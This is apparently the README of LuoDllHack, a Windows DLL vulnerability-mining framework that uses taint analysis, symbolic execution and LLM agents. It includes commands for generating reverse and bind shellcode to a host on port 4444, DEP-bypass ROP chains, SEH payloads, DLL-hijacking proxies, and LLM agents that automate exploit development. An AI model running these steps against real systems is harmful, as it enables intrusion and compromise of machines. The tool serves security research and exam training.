# LuoDllHack

**Windows DLL Automated Vulnerability Mining Framework v5.2.0**

[![Python 3.8+](https://img.shields.io/badge/Python-3.8+-blue.svg)](https://www.python.org/)
[![License](https://img.shields.io/badge/License-Research-green.svg)](#license)

> An automated framework focused on Windows DLL security research, providing a complete toolchain from vulnerability discovery and verification to exploit chain construction.

## Features Overview

- **Dual-Engine Taint Analysis** - Parallel analysis with TaintEngine + CFG DataFlow.
- **Intelligent Symbolic Execution** - Path pruning + loop detection + vulnerability-oriented priority.
- **Multi-Type Vulnerability Detection** - Buffer Overflow, UAF, Double-Free, Integer Overflow, Format String, etc.
- **Cross-Function Tracking** - Analyze calling chains and data passing between exported functions.
- **Dynamic Verification** - Speakeasy emulation to reduce false positives.
- **AI-Assisted Analysis** - Gemini-driven intelligent vulnerability mining Agent + vulnerability pattern knowledge base.
- **DLL Hijacking Tools** - Automatically generate proxy DLLs (x86/x64/ARM64).
- **Plugin System** - Extensible code pattern analysis + custom taint source/sink definitions.
- **Flexible Configuration** - YAML configuration + environment variable overrides.
- **[v5.0] Multi-Agent Collaboration** - 5 specialized Agents working in parallel (Scout/Verifier/Exploiter/Validator/Critic).
- **[v5.0] Multi-LLM Backend** - Supports Gemini / OpenAI / Ollama / Anthropic.
- **[v5.0] Parallel Execution** - ThreadPoolExecutor + LLM client pool.
- **[v5.1] EXP Generator** - Complete exploit chain with Shellcode/ROP chain/Encoder/Egghunter.
- **[v5.1] Multi-Architecture Support** - x86/x64 Windows Shellcode (reverse/bind shell).
- **[v5.1] DEP Bypass** - VirtualProtect/VirtualAlloc/WriteProcessMemory ROP chains.
- **[v5.2] COM Harness** - Automatically detect COM DLLs and generate targeted fuzzing harnesses.
- **[v5.2] GUID Auto-Discovery** - Automatically discover CLSID/IID from Registry and binaries.
- **0day Discovery Capability** - Neuro-symbolic reasoning + pattern learning + hybrid verification.

## Quick Start

### Installation

```bash
# Clone the project
git clone https://github.com/your-repo/LuoDllHack.git
cd LuoDllHack

# Install dependencies
pip install -r requirements.txt

# Or manually install
pip install ctf-toolkit
pip install pefile capstone              # Mandatory
pip install speakeasy-emulator           # Dynamic verification (Recommended)
pip install google-generativeai          # AI analysis (Optional)
pip install triton-library               # Precise taint (Optional)
pip install angr
```

### Basic Usage

```bash
# View capability status
python disasm_cli.py --info

# Automated vulnerability mining
python disasm_cli.py target.dll --hunt

# AI-enhanced analysis
python disasm_cli.py target.dll --hunt --api-key YOUR_GEMINI_KEY

# Generate proxy DLL
python disasm_cli.py target.dll --proxy --compile

# Use configuration file
python disasm_cli.py target.dll --hunt --config luodllhack.yaml
```

### Output Example

```
============================================================
LuoDllHack Vulnerability Analysis
============================================================
[*] Target: target.dll (x64)
[*] Exports: 42 functions

[*] Analyzing: ProcessUserInput @ 0x180001000
    [+] Found 3 taint path(s)
    [!] BUFFER_OVERFLOW @ 0x180001050 via memcpy (Confidence: 0.85)
    [!] USE_AFTER_FREE @ 0x1800010a0 via HeapFree (Confidence: 0.72)

============================================================
Summary
============================================================
  Total: 5 vulnerability(ies)
    Critical: 1 (HEAP_OVERFLOW)
    High: 2 (BUFFER_OVERFLOW, USE_AFTER_FREE)
    Medium: 2
```

## Detection Capabilities

| Vuln Type | CWE | Detection Method | Confidence |
|-----------|-----|------------------|------------|
| Buffer Overflow | CWE-120/122 | Taint Tracking + Bounds Check Analysis | High |
| Use-After-Free | CWE-416 | Memory Lifecycle Tracking | High |
| Double-Free | CWE-415 | free() Sequence + Loop Pattern Detection | High |
| Integer Overflow | CWE-190 | Arithmetic Ops + Memory Allocation Correlation | Medium |
| Format String | CWE-134 | printf Family Parameter Tracking | High |
| Command Injection | CWE-78 | System Call Parameter Taint Checking | Medium |
| Uninitialized Memory | CWE-908 | Reaching Definition Analysis | Medium |
| Path Traversal | CWE-22 | File Op Parameter Analysis | Medium |

## Core Modules

### 1. Taint Analysis Engine (TaintEngine)

Track how user input flows to dangerous APIs:

```python
from luodllhack.analysis import TaintEngine
from pathlib import Path

engine = TaintEngine(Path("target.dll"))
paths = engine.analyze_function(0x180001000, "ProcessInput")

for path in paths:
    print(f"{path.sink.vuln_type.name} @ 0x{path.sink.addr:x}")
    print(f"  Source: {path.source.api_name}")
    print(f"  Confidence: {path.confidence:.0%}")
```

### 2. Vulnerability Verification (Speakeasy)

Verify vulnerabilities with dynamic emulation:

```python
from luodllhack.verify import SpeakeasyVerifier
from pathlib import Path

verifier = SpeakeasyVerifier(Path("target.dll"))
result = verifier.verify(
    target_addr=0x180001050,
    vuln_type="BUFFER_OVERFLOW",
    trigger=True
)

print(f"Verified: {result.verified}")
print(f"Confidence: {result.confidence:.0%}")
```

### 3. DLL Hijacking Generation

Automatically generate proxy DLLs:

```python
from luodllhack.dll_hijack import ProxyGenerator
from pathlib import Path

generator = ProxyGenerator()
result = generator.generate_and_compile(
    Path("version.dll"),
    Path("./output")
)

print(f"Generated: {result['files']}")
```

### 4. Neuro-Symbolic Reasoning Engine (New in v4.5.2)

**Core 0day Discovery Engine**, combining Neural Networks and Symbolic Execution:

```python
from luodllhack.analysis.neuro_symbolic import ZeroDayDiscoveryEngine
from pathlib import Path

# Create 0day discovery engine
engine = ZeroDayDiscoveryEngine(
    Path("target.dll"),
    config=None  # Can use config file
)

# Learn new patterns from known vulnerabilities
taint_paths = [...]  # Obtained from taint analysis
zero_day_candidates = engine.discover_potential_0days(taint_paths)

print(f"Found {len(zero_day_candidates)} 0day candidates")
```

### 5. Enhanced Symbolic Execution Engine (New in v4.5.2)

**Advanced Constraint Solving**, supporting complex path condition analysis:

```python
from luodllhack.symbolic.enhanced import AdvancedSymbolicExecutor
from pathlib import Path

# Advanced symbolic executor
executor = AdvancedSymbolicExecutor(Path("target.dll"))

# Solve complex path constraints
solution = executor.solve_trigger_input(taint_path, timeout=120)
if solution:
    print(f"Generated trigger input: {len(solution)} bytes")
```

### 6. Intelligent Fuzzing Engine (New in v4.5.2)

**Hybrid Analysis Verification**, intelligent mutation strategy:

```python
from luodllhack.exploit.intelligent_fuzzing import HybridAnalysisEngine
from pathlib import Path

# Hybrid analysis engine
hybrid_engine = HybridAnalysisEngine(Path("target.dll"))

# Execute hybrid analysis verification
confirmed_paths = hybrid_engine.hybrid_analysis(taint_paths)
print(f"Confirmed {len(confirmed_paths)} vulnerability paths")
```

### 7. Vulnerability Pattern Learning System (New in v4.5.2)

**Unsupervised Vulnerability Detection**, learning unknown vulnerability patterns:

```python
from luodllhack.analysis.pattern_learning import AdvancedVulnerabilityMiner
from pathlib import Path

# Advanced vulnerability miner
miner = AdvancedVulnerabilityMiner(Path("target.dll"))

# Mine potential 0day vulnerabilities
zero_day_paths = miner.mine_zero_day_vulnerabilities(taint_paths)
print(f"Mined {len(zero_day_paths)} 0day candidates")
```

### 8. AI Vulnerability Hunting

Gemini-driven intelligent analysis with built-in vulnerability pattern knowledge base:

```python
from luodllhack.ai import VulnHuntingAgent
from luodllhack.ai.prompts import VulnPatternDB
from pathlib import Path

agent = VulnHuntingAgent(
    Path("target.dll"),
    api_key="YOUR_GEMINI_KEY"
)

report = agent.hunt(metadata, exports)
print(f"Found: {len(report.findings)} vulnerabilities")

# View vulnerability pattern database
db = VulnPatternDB()
pattern = db.get_pattern_for_vuln_type("BUFFER_OVERFLOW")
print(f"Pattern: {pattern.name}, ASM hints: {pattern.asm_patterns}")
```

### 9. Multi-Agent Collaboration Architecture (New in v5.0)

**True Parallel Multi-Agent Vulnerability Mining**, 5 specialized Agents working together:

```
┌─────────────────────────────────────────────────────────────┐
│                      Orchestrator                           │
│  (Task Decomposition / Scheduling / Results Aggregation)      │
└─────────────────────┬───────────────────────────────────────┘
                      │
        ┌─────────────┼─────────────┐
        │             │             │
   ┌────▼────┐  ┌────▼────┐  ┌────▼────┐
   │  Scout  │  │Verifier │  │Exploiter│  ← Run in separate threads
   │  Agent  │  │  Agent  │  │  Agent  │
   └────┬────┘  └────┬────┘  └────┬────┘
        │             │             │
        └─────────────┼─────────────┘
                      │
              ┌───────▼───────┐
              │  MessageBus   │  ← Priority Message Queue
              └───────┬───────┘
                      │
              ┌───────▼───────┐
              │ SharedState   │  ← Thread-safe state
              └───────────────┘
```

**Agent Responsibility Distribution:**

| Agent | Capability | Main Task |
|-------|------------|-----------|
| **ScoutAgent** | DISCOVERY, TAINT | Dangerous API scanning, initial taint analysis |
| **VerifierAgent** | VERIFICATION | Deep verification, bounds checking, FP reduction |
| **ExploiterAgent** | EXPLOITATION | Symbolic execution, PoC generation |
| **ValidatorAgent** | VALIDATION | PoC sandbox validation, crash analysis |
| **CriticAgent** | REVIEW | Quality review, evidence chain verification |

**Enable Multi-Agent Mode:**

```python
from luodllhack.ai import VulnHuntingAgent
from luodllhack.core.config import load_config
from pathlib import Path

# Method 1: Enable via config file
config = load_config("luodllhack.yaml")
config.ai_multi_agent = True
config.ai_multi_agent_workers = 4

agent = VulnHuntingAgent(Path("target.dll"), config=config)
report = agent.hunt(metadata, exports)

# Method 2: Directly use Orchestrator
from luodllhack.ai.agents import create_orchestrator

orchestrator = create_orchestrator(
    config=config,
    api_key="YOUR_API_KEY"
)

async with orchestrator:
    findings = await orchestrator.analyze(context)
```

**Enable via Command Line:**

```bash
# Enable multi-agent mode
python disasm_cli.py target.dll --hunt --multi-agent

# Specify number of worker threads
python disasm_cli.py target.dll --hunt --multi-agent --workers 8
```

### 10. EXP Generator (New in v5.1)

Complete exploit development toolchain, supporting all techniques required for OSED certification:

```bash
# Shellcode Generation
python exp_cli.py reverse 192.168.1.100 4444           # x86 reverse shell
python exp_cli.py reverse 192.168.1.100 4444 --arch x64  # x64 reverse shell
python exp_cli.py bind 4444                            # bind shell

# Pattern Generation and Offset Finding
python exp_cli.py pattern -l 1000                      # generate 1000-byte pattern
python exp_cli.py pattern -v 0x41414141                # find offset

# Shellcode Encoding
python exp_cli.py encode shellcode.bin -t xor -k 0xAA  # XOR encode
python exp_cli.py encode shellcode.bin -t alpha        # Alphanumeric encode

# ROP Chain Generation
python exp_cli.py rop target.dll -c virtualprotect     # VirtualProtect ROP
python exp_cli.py rop target.dll -c virtualalloc       # VirtualAlloc ROP
python exp_cli.py rop target.dll -c wpm                # WriteProcessMemory ROP

# SEH Exploitation
python exp_cli.py seh --offset 1000 --ppr 0x10101010   # SEH payload

# Egghunter
python exp_cli.py egg w00t -m seh                      # SEH egghunter

# API Hash Calculation
python exp_cli.py hash LoadLibraryA GetProcAddress     # ROR13 hash
```

**Supported Modules:**

| Module | Function | Technology |
|--------|----------|------------|
| **Shellcode** | reverse/bind shell | x86/x64, block_api, PEB traversal |
| **Encoder** | Bad character bypass | XOR/SUB/ADD/Alphanumeric/Unicode |
| **ROP Chain** | DEP bypass | VirtualProtect/VirtualAlloc/WPM |
| **SEH** | SafeSEH bypass | POP-POP-RET, nSEH jump generation |
| **Egghunter** | Small space utilization | SEH/NtAccess/IsBadReadPtr |
| **Pattern** | Offset location | Cyclic pattern generation/finding |

### 11. Multi-LLM Backend Support (New in v5.0)

Support multiple LLM backends, switch flexibly:

```python
from luodllhack.ai.agents import (
    create_backend,
    GeminiBackend,
    OpenAIBackend,
    OllamaBackend,
    AnthropicBackend
)

# Gemini (Default)
backend = GeminiBackend(api_key="...", model="gemini-2.5-flash")

# OpenAI
backend = OpenAIBackend(api_key="...", model="gpt-4")

# Ollama (Local models)
backend = OllamaBackend(
    base_url="http://localhost:11434",
    model="llama3"
)

# Anthropic Claude
backend = AnthropicBackend(api_key="...", model="claude-3-opus-20240229")

# Create via Factory Method
backend = create_backend("gemini", api_key="...", model="gemini-2.5-flash")
```

**Specify backend in config file:**

```yaml
# luodllhack.yaml
ai_backend: "openai"  # gemini | openai | ollama | anthropic

# OpenAI Config
ai_openai_api_key: "your-openai-key"  # Or use environment variable OPENAI_API_KEY
ai_openai_model: "gpt-4"

# Ollama Config (Local models)
ai_ollama_base_url: "http://localhost:11434"
ai_ollama_model: "llama3"

# Anthropic Config
ai_anthropic_api_key: "your-anthropic-key"
ai_anthropic_model: "claude-3-opus-20240229"
```

### 12. Intelligent Symbolic Execution

Path pruning + vulnerability-oriented exploration:

```python
from luodllhack.symbolic import EnhancedSymbolicExecutor
from pathlib import Path

executor = EnhancedSymbolicExecutor("target.dll", enable_pruning=True)

# Configure pruning parameters
executor.configure_pruner(
    max_loop_iterations=5,
    max_path_depth=1000,
    max_active_states=100
)

# Set vulnerability targets (dangerous API locations)
executor.set_vuln_targets({0x10001000, 0x10002000})

# Explore paths to vulnerability targets
paths = executor.explore_with_constraints(func_addr, target_addr)
print(f"Found {len(paths)} path(s) to target")
print(f"Stats: {executor.get_pruning_stats()}")
```

### 13. Plugin System

Extensible code pattern analysis framework:

```python
from luodllhack.analysis.plugins import (
    PluginManager, AnalysisPlugin, PluginContext,
    Finding, FindingType, TaintDefinitionPlugin
)

# Load plugins
manager = PluginManager()
loaded = manager.load_plugins()
print(f"Loaded plugins: {loaded}")

# Use in analysis loop
ctx = PluginContext(binary_path=Path("target.dll"), arch="x64", image_base=0x180000000)
for insn in instructions:
    findings = manager.on_instruction(insn, ctx)
    for f in findings:
        print(f"[{f.plugin_name}] {f.type.name} @ 0x{f.address:x}: {f.description}")
```

#### Custom Analysis Plugin

```python
class MyDetectorPlugin(AnalysisPlugin):
    name = "my_detector"
    description = "Detect custom vulnerability patterns"
    priority = 60

    def on_call(self, insn, target, api_name, ctx):
        if api_name and "dangerous" in api_name.lower():
            return [Finding(
                type=FindingType.DANGEROUS_CALL,
                address=insn.address,
                description=f"Call to dangerous function {api_name}",
                confidence=0.7
            )]
        return []
```

#### Extend Taint Source/Sink Definitions

```python
class MyTaintPlugin(TaintDefinitionPlugin):
    name = "my_taint_defs"
    description = "Custom taint sources and dangerous functions"

    def get_taint_sources(self):
        return {
            "MyInputAPI": {"type": "network", "tainted_ret": True},
            "ReadConfig": {"type": "file", "tainted_args": [1]}
        }

    def get_taint_sinks(self):
        return {
            "MyDangerousAPI": {
                "vuln_type": "BUFFER_OVERFLOW",
                "severity": "high",
                "sink_args": [0, 1]
            }
        }
```

Built-in Plugins:
- **DangerousAPIPlugin** - Detect dangerous API calls (memcpy, strcpy, etc.)
- **NoBoundsCheckPlugin** - Detect missing bounds checks in memory operations
- **IndirectCallPlugin** - Track indirect calls (call reg/mem)
- **IntegerOverflowPlugin** - Detect integer overflow risks
- **ReturnValueCheckPlugin** - Detect unchecked return values

## Configuration System

LuoDllHack supports flexible YAML configuration:

```yaml
# luodllhack.yaml
taint_max_depth: 3000           # Analysis depth
taint_cross_function: true      # Cross-function analysis
verify_enable_dynamic: true     # Dynamic verification
confidence_min_threshold: 0.45  # Confidence threshold

# AI Config
ai_model: "gemini-2.0-flash"
ai_temperature: 0.05

# Output Config
output_dir: "./output"
output_poc: true
output_report: true
```

Usage:

```bash
# Command line
python disasm_cli.py target.dll --hunt --config luodllhack.yaml

# Environment variable override
export LUODLLHACK_TAINT_MAX_DEPTH=5000
export GEMINI_API_KEY=your-key
```

See [luodllhack.example.yaml](luodllhack.example.yaml) for detailed parameter explanations.

## Project Structure

```
LuoDllHack/
├── disasm_cli.py              # CLI entry for vulnerability mining
├── exp_cli.py                 # [v5.1] CLI entry for EXP generator
├── luodllhack.example.yaml    # Config file example
├── luodllhack/                # Core framework
│   ├── core/                  # Infrastructure
│   │   ├── config.py          # Config management
│   │   ├── types.py           # Type definitions
│   │   └── logging.py         # Logging system
│   ├── analysis/              # Vuln analysis engines
│   │   ├── taint.py           # Taint analysis (TaintEngine)
│   │   ├── cfg.py             # Control Flow Graph
│   │   ├── dataflow.py        # Data flow analysis
│   │   ├── confidence.py      # Confidence scoring
│   │   ├── enhanced/          # Enhanced analysis modules
│   │   └── plugins/           # Plugin system
│   │       ├── base.py        # Plugin base class + manager
│   │       └── builtin.py     # Built-in analysis plugins
│   ├── verify/                # Vuln verification
│   │   └── speakeasy.py       # Speakeasy verifier
│   ├── dll_hijack/            # DLL hijacking tools
│   │   ├── generator.py       # Proxy generator
│   │   ├── emitters.py        # Code generation
│   │   └── compiler.py        # Compilation integration
│   ├── ai/                    # AI-assisted analysis
│   │   ├── agent.py           # VulnHuntingAgent (supports multi-agent)
│   │   ├── analyzer.py        # AI analyzer
│   │   ├── prompts.py         # Vuln pattern DB + layered prompts
│   │   └── agents/            # [v5.0] Multi-agent framework
│   │       ├── base.py        # Agent base class, message types
│   │       ├── message_bus.py # Message bus (inter-agent communication)
│   │       ├── shared_state.py # Thread-safe shared state
│   │       ├── llm_backend.py # LLM backend abstraction
│   │       ├── llm_pool.py    # LLM client pool
│   │       ├── executor.py    # Parallel executor
│   │       ├── orchestrator.py # Task orchestrator
│   │       ├── scout.py       # Scout Agent
│   │       ├── verifier.py    # Verifier Agent
│   │       ├── exploiter.py   # Exploiter Agent
│   │       ├── validator.py   # Validator Agent
│   │       └── critic.py      # Critic Agent
│   ├── symbolic/              # Symbolic execution
│   │   ├── executor.py        # Enhanced symbolic executor
│   │   ├── pruning.py         # Intelligent path pruning
│   │   └── solver.py          # Constraint solving
│   └── exploit/               # [v5.1] Exploit modules
│       ├── shellcode/         # Shellcode generation
│       │   ├── windows.py     # Windows x86/x64 shellcode
│       │   ├── encoder.py     # Shellcode encoders
│       │   └── egghunter.py   # Egghunter generation
│       ├── rop/               # ROP chain building
│       │   ├── gadget.py      # Gadget searcher
│       │   └── chain.py       # ROP chain generation
│       ├── bypass/            # Protection bypass
│       │   ├── aslr.py        # ASLR bypass
│       │   └── seh.py         # SEH exploitation
│       ├── payload.py         # Pattern/BadChar
│       └── exp_generator.py   # Unified EXP generator
├── disasm/                    # Disassembly engine
│   ├── engine.py              # DisasmEngine
│   └── integrated_analyzer.py # Integrated analyzer
└── docs/
    └── USAGE.md               # Detailed usage guide
```

## Usage Scenarios

### Scenario 1: System DLL Vulnerability Mining

```bash
# Analyze Windows system DLL
python disasm_cli.py C:\Windows\System32\version.dll --hunt -o ./results

# View report
cat ./results/report_*.json
```

### Scenario 2: DLL Hijacking Attack Research

```bash
# 1. Generate proxy DLL
python disasm_cli.py version.dll --proxy -o ./hijack

# 2. Compile (Visual Studio required)
cd hijack && build_version.bat

# 3. Verify export consistency
python disasm_cli.py version.dll -c "exports" > original.txt
python disasm_cli.py hijack/proxy_version.dll -c "exports" > proxy.txt
diff original.txt proxy.txt
```

### Scenario 3: Third-Party Software Security Audit

```bash
# Deep analysis mode
python disasm_cli.py software.dll --hunt \
    --config deep_analysis.yaml \
    --api-key $GEMINI_API_KEY \
    -o ./audit_results
```

## Dependencies

| Dependency | Purpose | Mandatory |
|------------|---------|-----------|
| pefile | PE file parsing | ✅ |
| capstone | Disassembly engine | ✅ |
| speakeasy-emulator | Dynamic verification | Recommended |
| google-generativeai | AI analysis | Optional |
| triton | Precise taint analysis | Optional |
| angr | Symbolic execution | Optional |

## Documentation

- [Usage Guide (USAGE.md)](USAGE.md) - Complete CLI and API reference.
- [Config Example (luodllhack.example.yaml)](luodllhack.example.yaml) - Detailed parameter explanations.

## Changelog

### v5.2.0 (Latest)
- **Universal COM Harness**: Automatically detect COM DLLs and generate dedicated fuzzing harnesses.
  - COM DLL Auto-Detection: Based on exports (DllGetClassObject/CreateObject).
  - CLSID/IID Auto-Discovery: Lookup registered COM classes from Registry.
  - Separate Analysis-Generation: Discover GUIDs during analysis, embed into harness during generation.
  - Simplified Harness Template: Removed runtime discovery code, kept only fuzzing logic.
- **com_discovery.py Refactoring**:
  - Removed app-specific hardcoding, fully universalized.
  - Enhanced `generate_harness_config()` to return discovered CLSID/IIDs.
  - Automatically use IUnknown as default IID.
- **Code Cleanup**: Removed all 7-Zip specific code, keeping framework universal.

### v5.1.0
- **EXP Generator**: Complete exploit development toolchain.
  - Windows Shellcode: x86/x64 reverse shell, bind shell (block_api technique).
  - Shellcode Encoders: XOR/SUB/ADD/Alphanumeric/Unicode/Multi-XOR.
  - ROP Chain Generation: VirtualProtect/VirtualAlloc/WriteProcessMemory.
  - SEH Exploitation: POP-POP-RET, nSEH jump generation.
  - Egghunter: SEH/NtAccess/IsBadReadPtr methods.
  - Pattern Tools: Generation/Offset finding.
  - API Hashing: ROR13 hash calculation.
- **exp_cli.py**: Added new CLI tool for EXP generation.
- **OSED Support**: Covers all exploit techniques required for OSED exam.

### v5.0.0
- **Multi-Agent Collaboration Architecture**: New parallel multi-agent vulnerability mining system.
  - Orchestrator: Task decomposition, scheduling, aggregation, workflow control.
  - 5 Specialized Agents: Scout / Verifier / Exploiter / Validator / Critic.
  - MessageBus: Real-time communication and collaboration between Agents.
  - SharedState: Thread-safe discovery management.
  - ParallelExecutor: ThreadPoolExecutor wrapper.
- **Multi-LLM Backend Support**: Flexible switching between different LLM providers.
  - Gemini (Default)
  - OpenAI GPT
  - Ollama (Local models)
  - Anthropic Claude
- **LLM Client Pool**: Supports parallel LLM calls, improving throughput.
- **Workflow Phase Management**: DISCOVERY → VERIFICATION → EXPLOITATION → VALIDATION → REVIEW.
- **Backward Compatibility**: Original single-agent mode still available.

### v4.5.2
- **0day Discovery Capability**: New neuro-symbolic reasoning engine + pattern learning system.
- **Hybrid Analysis Verification**: Taint Analysis + Symbolic Execution + Intelligent Fuzzing triple verification.
- **Enhanced Symbolic Execution**: Advanced constraint solving, supporting complex path conditions.
- **Intelligent Fuzzing**: AI-guided mutation strategies and real-time crash detection.
- **Significant FP Reduction**: Improved UNINITIALIZED_MEMORY detection, reduced FPs by 70% with context-aware filtering.
- **0day Candidate Identification**: Unknown vulnerability type discovery based on pattern learning.

### v4.5.1
- **Fixed x64 Dynamic Proxy Compilation**: Resolved MSVC LNK2001 errors (unresolved `_proxy_*` symbols).
  - Switched to DEF file exports instead of pragma comments.
  - Generate `proxy_{dll}_dynamic.def` for dynamic proxy export definition.
  - Build script automatically adds `/DEF:` link option.
- **Verifier Update**: Correctly checks DEF files for dynamic proxies instead of C source.
- **generate_and_compile Fix**: Pass DEF file path during dynamic compilation.
- **Architecture Detection**: Fixed 32/64-bit DLL deployment error prompts.

### v4.5
- **Plugin System**: Extensible code pattern analysis framework.
- **5 Built-in Plugins**: Dangerous API, Bounds Check, Indirect Call, Integer Overflow, Return Value Check.
- **TaintDefinitionPlugin**: Custom taint source and dangerous function definitions.
- **MemoryLifecyclePlugin**: Custom memory allocation/free API definitions.
- **PluginManager**: Auto-loading, prioritization, lifecycle management.

### v4.4
- **Intelligent Symbolic Execution**: Path pruning strategies (loop detection, depth limits, similar path merging).
- **Vulnerability-Oriented Exploration**: Prioritize paths reaching dangerous APIs.
- **Vuln Pattern DB**: 7 CWE patterns (CWE-120, 134, 416, 415, 190, 78, 22).
- **Layered Analysis Prompts**: Rapid Scan → Deep Analysis → Vuln Confirmation phases.
- **Structured AI Output**: Automatically parse JSON-formatted vulnerability reports from LLM.

### v4.3
- Configuration system refactored: YAML + environment variable support.
- Fixed mock implementations: All config parameters now actually take effect.
- Optimized default parameters: Adjusted confidence weights based on experience.
- Speakeasy Timeout Mechanism: Prevents emulation from blocking indefinitely.

### v4.2
- Deep AI Integration: ReAct loop enhancement.
- Dual-Engine Analysis Architecture: TaintEngine + CFG DataFlow.
- Uninitialized Memory Detection (CWE-908).
- Intelligent PoC Generation System.

### v4.1
- Enhanced Double-Free detection.
- Path-sensitive taint analysis.
- Harness auto-generation.

## License

This project is for security research and authorized penetration testing only. Users must comply with local laws and regulations and take full responsibility for any consequences arising from the use of this tool.

## Acknowledgements

- [Capstone](https://www.capstone-engine.org/) - Disassembly framework.
- [Speakeasy](https://github.com/mandiant/speakeasy) - Windows emulator.
- [Google Gemini](https://ai.google.dev/) - AI capability support.
